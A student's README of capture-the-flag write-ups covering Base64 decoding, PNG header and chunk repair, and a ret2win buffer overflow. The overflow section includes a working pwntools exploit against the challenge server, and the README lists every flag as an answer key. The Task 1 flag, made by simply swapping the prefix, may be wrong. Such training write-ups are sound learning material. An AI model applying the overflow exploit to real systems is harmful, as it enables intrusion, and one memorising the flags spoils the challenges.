# -Cybersecurity-Tasks
My solutions to BYTE MAIT Cybersecurity Tasks 1, 2, and 3. As a first-year student, I explored cybersecurity challenges, applied problem-solving skills, and worked hard to achieve the outputs while gaining hands-on experience.


# BYTE Cybersecurity Challenge - Solutions

This README contains complete step-by-step solutions for all three tasks.

---

## Task 01 - Cryptography (Simple Cipher)

### Challenge
```
QkFJTntiQTczX1E4Ul9BcmhIQ19YNHlHY0R9
```
Flag format: `BYTE{...}`

### Solution Steps

1. The given string looks like Base64.
2. Decode it using Base64:

```bash
echo "QkFJTntiQTczX1E4Ul9BcmhIQ19YNHlHY0R9" | base64 -d
```

3. Output:
```
BAIN{bA73_Q8R_ArhHC_X4yGcD}
```

4. The challenge requires the flag in format `BYTE{...}`.
5. Simply replace the prefix `BAIN` with `BYTE`.

### Final Flag
```
BYTE{bA73_Q8R_ArhHC_X4yGcD}
```

---

## Task 02 - Steganography (Corrupted PNG)

### Challenge
A corrupted PNG file was given.

### Solution Steps

1. **Analyze the PNG structure**
   - Valid PNG signature
   - IHDR chunk present but CRC is incorrect
   - Height was reduced from original value
   - A fake `IEND` chunk was inserted in the middle of IDAT data

2. **Find the real height**
   - Brute-forced the height value so that the calculated CRC matches the stored CRC in the file.
   - Real height = **850** (original was reduced to 800)

3. **Remove the fake IEND**
   - A fake IEND chunk (`00 00 00 00 IEND AE 42 60 82`) was present inside the compressed data.
   - Removed those 12 bytes to make the IDAT stream continuous.

4. **Reconstruct the image**
   - Extracted all IDAT compressed data
   - Decompressed using zlib (raw inflate)
   - Applied PNG scanline unfiltering
   - Rebuilt the image with correct dimensions: **724 × 850**

5. **Result**
   - The bottom ~50 rows (previously hidden) became visible.
   - Flag was written at the bottom of the image.

### Final Flag
```
flag{gOt_1t_in_plAin_sight}
```

---

## Task 03 - Binary Exploitation (Buffer Overflow / ret2win)

### Challenge
- Binary: `chall` (32-bit ELF)
- Remote: `nc cybersub.bytesoc.dev 9999`
- Flag format: `BYTE{...}`

### Solution Steps

1. **Basic Analysis**
```bash
file chall
strings chall
```

Important strings found:
- `Welcome to ret2win!`
- `Give me your input:`
- `You win!`
- `FLAG`

2. **Disassemble the binary**
```bash
objdump -d chall
```

Key functions:
- `vuln()` → Contains the vulnerability
- `win()` → Address = `0x80491a6` (prints the flag)

3. **Understand the vulnerability**

In `vuln()`:
- Small buffer is allocated (~68 bytes)
- `read(0, buffer, 0xc8)` → Reads 200 bytes
- Classic **Buffer Overflow**

Stack layout:
- Buffer starts at `-0x48(%ebp)`
- Distance to return address = **76 bytes**

4. **Create the payload**
```python
from pwn import *

win = 0x80491a6
offset = 76

payload = b"A" * offset + p32(win)
```

5. **Exploit the remote service**
```python
from pwn import *

io = remote("cybersub.bytesoc.dev", 9999)
io.recvuntil(b"input:")
io.send(payload)
print(io.recvall().decode())
```

6. **Result**
```
You win!
BYTE{Buff3r_OverFl0w_k3_N45he}
```

### Final Flag
```
BYTE{Buff3r_OverFl0w_k3_N45he}
```

---

## Summary of All Flags

| Task | Category              | Flag                              |
|------|-----------------------|-----------------------------------|
| 01   | Cryptography          | `BYTE{bA73_Q8R_ArhHC_X4yGcD}`     |
| 02   | Steganography         | `flag{gOt_1t_in_plAin_sight}`     |
| 03   | Binary Exploitation   | `BYTE{Buff3r_OverFl0w_k3_N45he}`  |

---

**Note:**  
Task 02 flag format is `flag{...}` as mentioned in the challenge.  
Task 01 and Task 03 use `BYTE{...}` format.
